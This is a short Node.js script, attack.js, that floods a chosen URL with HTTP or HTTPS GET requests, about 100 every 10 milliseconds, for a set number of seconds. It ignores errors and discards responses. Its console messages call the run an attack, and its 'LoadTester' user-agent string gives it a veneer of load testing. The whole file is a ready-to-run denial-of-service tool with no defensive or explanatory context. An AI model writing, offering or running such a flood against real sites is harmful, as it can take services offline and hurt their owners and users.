const https = require('https');
const http = require('http');
const { URL } = require('url');

if (process.argv.length < 4) {
  console.log("Usage: node attack.js <url> <duration_in_seconds>");
  process.exit(1);
}

const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const endTime = Date.now() + duration * 1000;

const url = new URL(target);
const client = url.protocol === 'https:' ? https : http;

function flood() {
  const options = {
    hostname: url.hostname,
    port: url.port || (url.protocol === 'https:' ? 443 : 80),
    path: url.pathname + url.search,
    method: 'GET',
    headers: {
      'User-Agent': 'LoadTester/1.0',
      'Accept': '*/*'
    }
  };

  const req = client.request(options, res => {
    res.resume(); // Discard response data
  });

  req.on('error', () => { /* Ignore errors */ });
  req.end();
}

function startFlood() {
  const floodInterval = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(floodInterval);
      clearInterval(statusLog);
      console.log("Attack completed.");
      return;
    }

    for (let i = 0; i < 100; i++) {
      flood();
    }
  }, 10);

  const statusLog = setInterval(() => {
    const timeLeft = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
    console.log(`[INFO] ATTACK RUNNING - ${timeLeft}s remaining`);
  }, 2000);
}

console.log(`Starting attack on ${target} for ${duration} seconds...`);
startFlood();
